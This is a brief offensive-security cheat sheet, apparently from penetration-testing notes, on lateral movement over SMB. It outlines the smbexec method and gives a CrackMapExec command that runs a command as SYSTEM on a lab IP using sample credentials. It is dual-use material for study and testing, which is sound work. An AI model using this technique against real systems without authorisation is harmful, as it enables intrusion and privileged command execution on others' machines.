## Attack: Execute commands on remote machine using SMB protocol.
### How it Works:

- Authenticate with valid credentials
- Create temporary service on target (smbexec method)
- Service executes commands as SYSTEM
- Delete service after execution

### Tool: CrackMapExec with smbexec
```bash
crackmapexec smb 192.168.57.101 -u user1 -p Password123! -x "whoami" --exec-method smbexec
``` 
**Goal**: Move from one machine to another, execute commands remotely
